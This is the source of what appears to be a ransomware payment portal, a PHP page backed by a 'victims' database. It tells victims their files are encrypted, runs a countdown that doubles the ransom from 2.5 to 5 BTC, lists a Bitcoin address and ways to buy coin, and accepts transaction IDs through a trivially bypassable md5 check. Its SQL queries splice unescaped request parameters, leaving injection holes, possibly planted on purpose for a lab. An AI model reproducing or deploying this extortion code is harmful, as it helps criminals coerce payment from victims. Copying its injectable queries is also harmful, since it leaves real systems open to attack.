<html>
<head>
  <title>
    Decryption Check
  </title>
  <script src="/scripts/jquery.js"></script>

<?php

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "victims";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$getTransID = $_GET['trans_id'];
$getTargetID = $_GET['unique_id'];

$getCountdown = "";
$getExpTime = "";

if (isset($_GET['trans_id']) && !empty($_GET['trans_id'])) {
   if (strlen($_GET['trans_id']) == 64) {
      $transSplit = str_split($_GET['trans_id'], 32);
      
      if ($transSplit[1] == md5("m4dh4tz")) {
         $checkPay = "SELECT * from target_list";

         $result = $conn->query($checkPay);

         if ($result->num_rows > 0) {
            while($row = $result->fetch_assoc()) {
               if ("$row[paid]" != "1") {
                  $sql = "UPDATE target_list SET paid = 1 where unique_id = \"$getTargetID\"";

                  if ($conn->query($sql) === TRUE) {
                     $expTime = time() + (1 * 2 * 60 * 10);
                     $dateExpTime = new DateTime("@$expTime");
                     $expTime = $dateExpTime->format('Y-m-d H:i:s');

                     $sql1 = "UPDATE target_list SET paid_count = \"$expTime\" WHERE unique_id = \"$getTargetID\"";

                     if ($conn->query($sql1) === TRUE) {
                        echo "<script>alert(\"Your transaction id has been confirmed, Please wait!\");</script>";
                        header('location: https://' .  $_SERVER['SERVER_NAME'] . '/payment_info.php?unique_id=' . $getTargetID);
                     } else {
                        echo "<script>alert(\"Error 1: An unexpected error occurred, please try again momentarily.\")</script>";
                     }
                  } else {
                     echo "<script>alert(\"Error 2: An unexpected error occurred, please try again momentarily.\")</script>";
                  }
               } elseif ("$row[paid_count]" == "0000-00-00 00:00:00") {
                  $expTime = time() + (1 * 2 * 60 * 60);
                  $dateExpTime = new DateTime("@$expTime");
                  $expTime = $dateExpTime->format('Y-m-d H:i:s');

                  $sql1 = "UPDATE target_list SET paid_count = \"$expTime\" WHERE unique_id = \"$getTargetID\"";

                  if ($conn->query($sql1) === TRUE) {
                     echo "<script>alert(\"Your transaction id has been confirmed, Please wait!\");</script>";
                     header('location: https://' .  $_SERVER['SERVER_NAME'] . '/payment_info.php?unique_id=' . $getTargetID);
                  } else {
                     echo "<script>alert(\"Error 1: An unexpected error occurred, please try again momentarily.\")</script>";
                  } 
               } else {
                  header('location: https://' .  $_SERVER['SERVER_NAME'] . '/payment_info.php?unique_id=' . $getTargetID);
               }
            }
         }
      } else {
         echo "<script>alert(\"Your transaction id could not be confirmed, Please try again!\");</script>";
      }
   } else {
      echo "<script>alert(\"Your transaction id could not be confirmed, Please try again!\");</script>";
   } 
}

if (isset($_GET['unique_id']) && !empty($_GET['unique_id'])) {
   $sql = "SELECT timediff(exp_time, curr_time) as time_left from target_list where unique_id = \"$getTargetID\"";
   $result = $conn->query($sql);

   if ($result->num_rows > 0) {
      while ($row = $result->fetch_assoc()) { 
         $getCountdown = $row[time_left];

         //if ($row['time_left'] > "00:00:01") {
            echo "<script>" . "\n";
            echo "   $(document).ready(function() {" . "\n";
            echo "     setInterval(function() {" . "\n";
            echo "       $.get(\"pay_query.php?unique_id=$getTargetID\", function (result) {" . "\n";
            echo "         $('#show_timer').html(result);" . "\n";
            echo "       });" . "\n";
            echo "     }, 1000);" . "\n";
            echo "  });" . "\n";
            echo "</script>" . "\n"; 
         //}
      }
   }

   $sql1 = "SELECT * FROM target_list where unique_id = \"$getTargetID\"";
   $result1 = $conn->query($sql1);

   if ($result1->num_rows > 0) {
      while ($row1 = $result1->fetch_assoc()) {
         $victimIP = $row1[target_ip];
         $getExpTime = $row1[exp_time];
         $fileCount = $row1[file_count];
      }
   }
}
?>

<body bgcolor="lightblue">
  <center>
  <?php if ($getCountdown > "00:00:01") { ?>
  <?php $bitcoinValue = "2.5 BTC" ?>
  <table style="padding-left: 1em; padding-right: 1em; background: white;border-radius:10px;-moz-border-radius:10px;-webkit-border-radius:10px;">
    <tr>
      <td align="center">
       <b>Your files have been encrypted!</b>
      </td>
    </tr>
    <tr>
      <td align="center">
        To get the private key and the download script, you must submit your payment before the timer ends.
      </td>
    </tr>
    <tr>
      <td align="center">
        You must submit your payment before 
        <font size="5">
          <b><?php echo $getExpTime; ?></b>
        </font> or the price will increase!
      </td>
    </tr>
    <tr>
      <td align="center">
        Your time expires in
      </td>
    </tr>
    <tr>
      <td align="center">
        <div id="show_timer">
          <font size="5">
            <b><?php echo $getCountdown ?></b>
          </font>
        </div>
      </td>
    </tr>
    <tr>
      <td align="center">
        <hr />
        First Connected IP: <?php echo $victimIP ?> Total encrypted Files: <?php echo $fileCount ?>
      </td>
    </tr>
  </table>

  <br /><br />
  
  <?php } else { ?>
  <?php $bitcoinValue = "5 BTC" ?>
  <table style="padding-left: 1em; padding-right: 1em; background: white;border-radius:10px;-moz-border-radius:10px;-webkit-border-radius:10px;">
    <tr>
      <td align="center">
        <b>Your files have been encrypted!</b>
      </td>
    </tr>
    <tr>
      <td align="center">
        <font color="red">
          Your time has expired and the price has increased!
        </font>
      </td>
    </tr>
    <tr>
      <td align="center">
        To get the private key and the decryption script, you must submit your paymentat the higher rate!
      </td>
    </tr>
    <tr>
      <td align="center">
        Your time is
        <font size="5">
          <div id="show_timer">
          </div>
        </font>
        overdue!
      </td>
    </tr>
    <tr>
      <td align="center">
        <hr />
        First Connected IP: <?php echo $victimIP ?> Total encrypted Files: <?php echo $fileCount ?>
      </td>
    </tr>
  </table>

  <br /><br />

  <?php } ?>

  <table style="padding-left: 1em; padding-right: 1em; background: white;border-radius:10px;-moz-border-radius:10px;-webkit-border-radius:10px;">
    <tr>
      <td align="center">
        We present a special software, called BashDecrypt that allows you to decrypt your files.
      </td>
    </tr>
    <tr>
      <td align="center">
        <b>How to buy the BashDecrypt software?</b>
      </td>
    </tr>
    <tr>
      <td align="center">
        <hr />
        <br />
        <img src="/images/bitcoin.png">
        <br />
        <br />
      </td>
    </tr>
    <tr>
      <td align="left" style="color: #000000; background-color: #32CD32">
        1. <b>You should click <b><a href="https://bitcoin.org/en/getting-started">here</a></b> to find out how to sign up for a Bitcoin wallet.</b>
      </td>
    </tr>
    <tr>
      <td>
        &nbsp;
      </td>
    </tr>
    <tr>
      <td align="left" style="color: #000000; background-color: #32CD32">
        2. <b>Buying Bitcoin is getting simpler every day, See the below for ways to buy Bitcoin:</b>
      </td>
    </tr>
    <tr>
      <td align="left">
        <ul>
          <li>
            <a href="/exchange/index.php">M4dH4t'z Exchange</a> - <b><font color="red">We now only accept Bitcoin from this Exchange!</font></b>
          </li>
          <li>
            <!--<a href="http://localbitcoins.com">-->LocalBitcoins.com (WU)<!--</a>--> - Buy Bitcoin with Western Union
          </li>
          <li>
            <!--<a href="http://coincafe.com">-->CoinCafe.com<!--</a>--> - <b>Recommended for fast, simple service. 
            <br />
            Payment methods: Western Union, Bank of America, Cash by FedEx, Moneygram, Money Order. 
            <br />
            In NYC: Bitcoin ATM, In Person</b>
          </li>
          <li>
            <!--<a href="http://btcdirect.eu">-->BTCDirect.eu<!--</a>--> - The best place for EUROPE
          </li>
        </ul>
      </td>
    </tr>
    <tr>
      <td align="left" style="color: #000000; background-color: #32CD32">
        3. <b>Send <font color="#8B0000"><?php echo $bitcoinValue; ?></font> BTC to Bitcoin address:     <font color="#8B0000">10Lq24MSC9jB6DgQWZ917kFapajwNMifpgT</font></b>
      </td>
    </tr> 
    <tr>
      <td>
        &nbsp;
      </td>
    </tr>
    <tr>
      <td align="left" style="color: #000000; background-color: #32CD32">
          4. <b>Enter the Transaction ID: <input size="50" id="trans_id" type="text"> Amount: <?php echo $bitcoinValue; ?></b>
          <br />
          <font size="2"><b>Transaction ID - You can find this information in your transaction details</b></font>
      </td>
    </tr>
    <tr>
      <td>
        &nbsp;
      </td>
    </tr>
    <tr>
      <td align="left" style="color: #000000; background-color: #32CD32">
          5. <b>Ensure your payment information and then Click 'Pay'</b>
      </td>
    </tr>
    <tr>
      <td>
        &nbsp;
      </td>
    </tr>
    <tr>
      <td align="center">
        <a href="/payment.php" onClick="location.href=this.href + '?unique_id=<?php echo $getTargetID; ?>&trans_id=' + document.getElementById('trans_id').value; return false;"><input type="submit" value="Pay"></a>
      </td>
    </tr>
  </table>  
  </center>
</body>
</html>

<?php

$conn->close();

?>
